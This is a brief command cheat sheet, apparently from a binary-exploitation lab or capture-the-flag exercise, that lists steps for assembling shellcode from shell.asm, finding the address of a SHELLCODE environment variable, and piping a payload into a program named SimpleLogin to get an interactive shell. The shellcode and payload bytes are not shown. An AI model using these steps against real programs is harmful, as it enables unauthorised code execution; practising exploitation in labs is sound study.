COMPILE ASSEMBLY
----------------------
nasm -f elf shell.asm
ld -o shell shell.o 

FIND THE ENV LOCATION
----------------------
./getenvaddr SHELLCODE <programname>

EXPLOITATION
----------------------
(cat payload; cat -) | ./SimpleLogin
